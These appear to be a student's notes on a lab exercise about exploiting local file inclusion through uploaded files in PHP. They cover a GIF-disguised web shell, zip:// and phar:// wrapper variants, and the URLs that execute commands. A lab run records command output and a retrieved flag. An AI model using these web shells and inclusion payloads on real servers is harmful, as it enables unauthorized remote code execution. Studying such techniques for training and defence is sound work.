# LFI and File Uploads

ZLocal vs. Remote File Inclusion

Function	Read Content	Execute	Remote URL

PHP			

include()/include_once()	✅	✅	✅

file_get_contents()	✅	❌	✅

Java			

import	✅	✅	✅

.NET			

@Html.RemotePartial()	✅	❌	✅

include	✅	✅	✅

## Image upload

### Crafting Malicious Image
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

GIF8 : the image magic bytes at the beginning of the file content

--> go to the Profile Settings page and click on the avatar image to select our image

### Uploaded File Path

Inspect the source code after uploading the image :
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">

--> we can also fuzz for an uploads directory, and then fuzz for our uploaded file

http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

If the source prefix a directroy before file :  use ../

## Zip Upload

Zip wrapper isn't enabled by default, so this method may not always work. 

### Creating a PHP web shell script and zipping it
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

### Use zip wrapper
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

## Phar Upload

Use the phar:// wrapper to achieve a similar result

### Create PHP script
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

shell.php

### Compile it into a phar file and rename it to shell.jpg as follows
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

### Use Phar wrapper
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

--> zip and phar wrapper methods should be considered as alternative methods in case the first method did not work

## LAB

http://83.136.253.251:34459/index.php?language=en.php

echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

http://83.136.253.251:34459/settings.php

    <div class="navbar">
        <a href="/index.php">Inlane Freight</a>
        <a href="/settings.php">Profile Settings</a>
    </div>
    <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
        <h1 style="font-weight: 600; font-family: neue-haas-unica,sans-serif; text-align: center;">
            Update
            your profile image</h1>
        <center>
            <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm"
                style="height: 200px; width: 150px;">
                <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)"
                    accept=".jpg,.jpeg,.png,.gif,.zip">
                <img src='/profile_images/default.jpg' class='profile-image' id='profile-image'>
                <input type="submit" value="Upload" id="submit">
            </form>

http://83.136.253.251:34459/index.php?language=./profile_images/shell.gif&cmd=id

GIF8uid=33(www-data) gid=33(www-data) groups=33(www-data)

http://83.136.253.251:34459/index.php?language=./profile_images/shell.gif&cmd=ls%20-l%20/

GIF8total 60 -rw-r--r-- 1 root root 28 Mar 25 2022 2f40d853e2d4768d87da1c81772bae0a.txt lrwxrwxrwx 1 root root 7 Jul 20 2020 bin -> usr/bin drwxr-xr-x 2 root root 4096 Apr 15 2020 boot drwxr-xr-x 5 root root 360 Jan 1 11:52 dev drwxr-xr-x 1 root root 4096 Mar 25 2022 etc drwxr-xr-x 2 root root 4096 Apr 15 2020 home lrwxrwxrwx 1 root root 7 Jul 20 2020 lib -> usr/lib lrwxrwxrwx 1 root root 9 Jul 20 2020 lib32 -> usr/lib32 lrwxrwxrwx 1 root root 9 Jul 20 2020 lib64 -> usr/lib64 lrwxrwxrwx 1 root root 10 Jul 20 2020 libx32 -> usr/libx32 drwxr-xr-x 2 root root 4096 Jul 20 2020 media drwxr-xr-x 2 root root 4096 Jul 20 2020 mnt drwxr-xr-x 2 root root 4096 Jul 20 2020 opt dr-xr-xr-x 364 root root 0 Jan 1 11:52 proc drwx------ 1 root root 4096 Aug 19 2020 root drwxr-xr-x 1 root root 4096 Feb 14 2021 run lrwxrwxrwx 1 root root 8 Jul 20 2020 sbin -> usr/sbin drwxr-xr-x 2 root root 4096 Jul 20 2020 srv dr-xr-xr-x 13 root root 0 Jan 1 11:52 sys drwxrwxrwt 1 root root 4096 Jan 1 12:00 tmp drwxr-xr-x 1 root root 4096 Jul 20 2020 usr drwxr-xr-x 1 root root 4096 Aug 19 2020 var

http://83.136.253.251:34459/index.php?language=./profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt

GIF8HTB{upl04d+lf!+3x3cut3=rc3}
